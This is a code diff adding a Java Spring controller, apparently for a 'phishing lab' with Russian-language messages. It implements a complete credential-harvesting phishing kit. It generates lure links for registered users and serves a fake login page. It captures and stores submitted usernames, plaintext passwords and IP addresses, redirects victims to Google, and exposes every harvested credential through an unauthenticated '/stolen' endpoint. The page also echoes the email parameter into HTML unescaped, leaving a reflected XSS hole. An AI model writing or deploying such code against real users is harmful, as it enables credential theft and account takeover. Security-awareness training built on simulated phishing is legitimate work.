@@ -1,0 +1,89 @@
+package org.example.phishinglab.controller;
+
+import org.example.phishinglab.model.*;
+import org.example.phishinglab.repository.*;
+import jakarta.servlet.http.HttpServletRequest;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.web.bind.annotation.*;
+import java.time.LocalDateTime;
+import java.util.List;
+
+@RestController
+public class PhishingController {
+
+    @Autowired
+    private ValidUserRepository validRepo;
+
+    @Autowired
+    private StolenCredentialRepository stolenRepo;
+
+    @PostMapping("/start-phishing")
+    public String startPhishing() {
+        List<ValidUser> users = validRepo.findAll();
+        if (users.isEmpty()) {
+            return "⚠️ Нет валидных пользователей! Сначала зарегистрируйте email.";
+        }
+
+        System.out.println("\n🎣 === ФИШИНГ АТАКА ===");
+        for (ValidUser user : users) {
+            System.out.println("📧 Цель: " + user.getEmail());
+            System.out.println("🔗 Ссылка: http://localhost:8080/fake-login?email=" + user.getEmail());
+        }
+        System.out.println("=====================\n");
+
+        return "✅ Фишинг запущен для " + users.size() + " пользователей!\n" +
+                "Фейковая страница: http://localhost:8080/fake-login";
+    }
+
+    @GetMapping("/fake-login")
+    public String fakeLoginPage(@RequestParam(required = false) String email) {
+        String emailValue = (email != null) ? email : "";
+
+        return "<!DOCTYPE html>\n" +
+                "<html>\n" +
+                "<head>\n" +
+                "    <title>Вход в систему</title>\n" +
+                "    <style>\n" +
+                "        body { font-family: Arial; text-align: center; margin-top: 100px; }\n" +
+                "        .container { border: 1px solid #ccc; padding: 30px; width: 300px; margin: 0 auto; border-radius: 10px; }\n" +
+                "        input { margin: 10px; padding: 8px; width: 250px; }\n" +
+                "        button { padding: 8px 30px; background: #4CAF50; color: white; border: none; border-radius: 5px; }\n" +
+                "    </style>\n" +
+                "</head>\n" +
+                "<body>\n" +
+                "    <div class='container'>\n" +
+                "        <h2>🔐 Вход в систему</h2>\n" +
+                "        <form action='/capture' method='POST'>\n" +
+                "            <div>Email: <input type='text' name='emailOrUser' value='" + emailValue + "'></div>\n" +
+                "            <div>Пароль: <input type='password' name='password'></div>\n" +
+                "            <div><button type='submit'>Войти</button></div>\n" +
+                "        </form>\n" +
+                "    </div>\n" +
+                "</body>\n" +
+                "</html>";
+    }
+    @PostMapping("/capture")
+    public String capture(@RequestParam String emailOrUser,
+                          @RequestParam String password,
+                          HttpServletRequest request) {
+        StolenCredential stolen = new StolenCredential();
+        stolen.setEmailOrUsername(emailOrUser);
+        stolen.setPassword(password);
+        stolen.setIpAddress(request.getRemoteAddr());
+        stolen.setStolenAt(LocalDateTime.now());
+        stolenRepo.save(stolen);
+
+        System.out.println("\n💀💀💀 УКРАДЕНО! 💀💀💀");
+        System.out.println("📧 Логин: " + emailOrUser);
+        System.out.println("🔑 Пароль: " + password);
+        System.out.println("🌐 IP: " + request.getRemoteAddr());
+
+
+        return "<script>alert('Ошибка входа!'); location.href='https://google.com';</script>";
+    }
+
+    @GetMapping("/stolen")
+    public List<StolenCredential> getStolen() {
+        return stolenRepo.findAll();
+    }
+}
